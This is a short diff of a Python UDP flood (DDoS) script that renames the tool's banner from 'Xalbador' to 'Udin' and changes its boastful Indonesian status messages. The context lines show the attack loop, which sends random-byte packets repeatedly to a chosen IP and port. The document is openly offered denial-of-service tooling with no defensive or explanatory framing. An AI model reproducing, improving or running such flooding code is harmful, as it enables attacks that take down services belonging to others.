@@ -6,7 +6,7 @@ import os
 import sys
 
 os.system("clear")
-print(" ToolDdosByXalbador ")
+print(" ToolDdosByUdin ")
 print("  ██╗░░██╗██╗░░░░░██████╗░██████╗░ ")
 print("  ╚██╗██╔╝██║░░░░░██╔══██╗██╔══██╗ ")
 print("  ░╚███╔╝░██║░░░░░██████╦╝██║░░██║ ")
@@ -28,9 +28,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" PERMISI PACKETS !!!")
+			print(i +" PERMISI PACKETS JNE !!!")
 		except:
-			print("[!] BOOM!!!")
+			print("[!] KESIAN KENA DDOS!!!")
 
 def run2():
 	data = random._urandom(16)
